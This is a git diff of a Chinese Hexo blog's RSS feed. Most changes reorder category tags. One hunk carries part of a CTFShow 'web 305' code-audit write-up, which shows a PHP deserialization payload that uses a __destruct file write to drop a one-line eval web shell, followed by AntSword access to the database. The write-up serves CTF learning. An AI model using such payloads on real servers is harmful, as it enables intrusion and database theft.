@@ -7,31 +7,35 @@
         <language>zh-CN</language>
         <pubDate>Sun, 15 Jan 2023 22:53:15 +0800</pubDate>
         <lastBuildDate>Sun, 15 Jan 2023 22:53:15 +0800</lastBuildDate>
-        <category>git</category>
+        <category>Qt</category>
         <category>ms17</category>
         <category>msf</category>
-        <category>Qt</category>
+        <category>git</category>
         <category>CTF</category>
         <category>sql注入</category>
-        <category>MFC</category>
         <category>笔记</category>
-        <category>Misc</category>
         <category>SSRF</category>
         <category>kali</category>
         <category>nmap</category>
-        <category>队列</category>
-        <category>数据结构</category>
+        <category>Misc</category>
+        <category>MFC</category>
+        <category>cryptography</category>
+        <category>ctfshow</category>
+        <category>Web</category>
         <category>树</category>
         <category>二叉树</category>
-        <category>动态规划</category>
+        <category>数据结构</category>
+        <category>hexo</category>
+        <category>队列</category>
         <category>前缀和</category>
+        <category>动态规划</category>
         <category>滑动窗口</category>
         <category>数组</category>
         <category>哈希表</category>
         <category>链表</category>
+        <category>矩阵</category>
         <category>递归</category>
         <category>贪心</category>
-        <category>矩阵</category>
         <category>子序列</category>
         <category>最长公共子序列</category>
         <category>最长回文子序列</category>
@@ -39,15 +43,11 @@
         <category>括号</category>
         <category>vector</category>
         <category>栈</category>
-        <category>排列组合</category>
         <category>双指针（快慢指针）</category>
+        <category>排列组合</category>
         <category>等差数列</category>
         <category>深度优先搜索</category>
         <category>广度优先搜索</category>
-        <category>hexo</category>
-        <category>ctfshow</category>
-        <category>Web</category>
-        <category>cryptography</category>
         <item>
             <guid isPermalink="true">http://dpm12345.cn/posts/9e150aa2/</guid>
             <title>代码审计</title>
@@ -118,7 +118,7 @@
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$u&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$u&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;1.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;urlencode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;按以上操作后，访问 &lt;code&gt;1.php&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;可以看到报错，使用蚁剑连接数据库&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web_305.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;数据库类型为 &lt;code&gt;MYSQLI&lt;/code&gt; ，密码为 &lt;code&gt;root&lt;/code&gt;  (改密码可在蚁剑文件界面的 &lt;code&gt;conn.php&lt;/code&gt;  找到，与下载来的源码文件不同)&lt;/p&gt;
+&lt;p&gt;数据库类型为 &lt;code&gt;MYSQLI&lt;/code&gt; ，密码为 &lt;code&gt;root&lt;/code&gt;  (该密码可在蚁剑文件界面的 &lt;code&gt;conn.php&lt;/code&gt;  找到，与下载来的源码文件不同)&lt;/p&gt;
 &lt;p&gt;通过查表，得到 flag 在 &lt;code&gt;sds.sds_flabag&lt;/code&gt;&lt;/p&gt;
 &lt;h1 id=&#34;web-306&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-306&#34;&gt;#&lt;/a&gt; web 306&lt;/h1&gt;
 &lt;p&gt;查看代码，发现 &lt;code&gt;index.php&lt;/code&gt;  有反序列化操作&lt;/p&gt;
